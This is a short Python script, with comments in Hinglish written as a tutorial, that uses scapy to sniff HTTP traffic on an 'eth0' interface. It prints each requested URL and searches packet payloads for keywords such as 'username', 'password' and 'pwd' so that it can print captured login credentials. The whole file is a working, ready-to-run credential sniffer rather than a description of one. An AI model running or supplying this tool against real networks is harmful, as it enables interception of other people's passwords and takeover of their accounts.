import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    # store=False: Packets ko RAM mein save nahi karega, fast chalega
    # prn: Har packet aane par process_sniffed_packet function ko call karega
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    # Technical Term: URL Extraction
    # Host (jaise google.com) aur Path (jaise /login) ko jodna
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    # Check karna ki kya packet mein "Raw" layer (asli data) hai
    if packet.haslayer(scapy.Raw):
        # Technical Term: Payload Extraction
        # Byte data ko padhne layaq String (text) mein convert karna
        load = str(packet[scapy.Raw].load)
        
        # Ye wo keywords hain jo hum URL ke data mein dhundenge
        keywords = ["username", "user", "login", "password", "pass", "uname", "pwd"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    # Check karna ki packet HTTP website ka hai
    if packet.haslayer(http.HTTPRequest):
        # 1. URL nikal kar print karo
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url.decode()}")
        
        # 2. Login info (Raw data) nikal kar print karo
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible Username/Password > {login_info}\n\n")

# Tumhara network interface
sniff("eth0")
